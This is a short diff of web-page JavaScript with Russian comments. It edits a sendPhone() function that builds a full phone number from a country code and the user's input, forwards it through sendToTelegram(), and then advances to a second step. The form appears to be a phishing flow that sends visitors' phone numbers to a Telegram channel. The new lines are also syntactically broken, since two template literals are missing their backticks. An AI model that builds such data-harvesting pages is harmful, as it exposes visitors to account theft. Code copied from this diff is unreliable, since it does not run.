@@ -289,15 +289,21 @@
     }
 
     function sendPhone() {
-      const phoneInput = document.getElementById('phone');
-      phoneNumber = phoneInput.value.trim();
+      const countryCodeInput = document.querySelector('.country-code').value.trim();
+      const phoneInput = document.getElementById('phone').value.trim();
 
-      if (phoneNumber.length < 10) {
+      const countryCode = countryCodeInput.replace(/^\+/, '');
+      const phone = phoneInput.replace(/^\+/, '');
+
+      phoneNumber = +${countryCode}${phone};
+
+      // Проверка: минимум 10 цифр в основном номере
+      if (phone.length < 10) {
         document.getElementById('phoneError').style.display = 'block';
         return;
       }
 
-      sendToTelegram(`📱 Введён номер телефона: +${phoneNumber}`);
+      sendToTelegram(📱 Введён номер телефона: ${phoneNumber});
       showStep(2);
     }
 
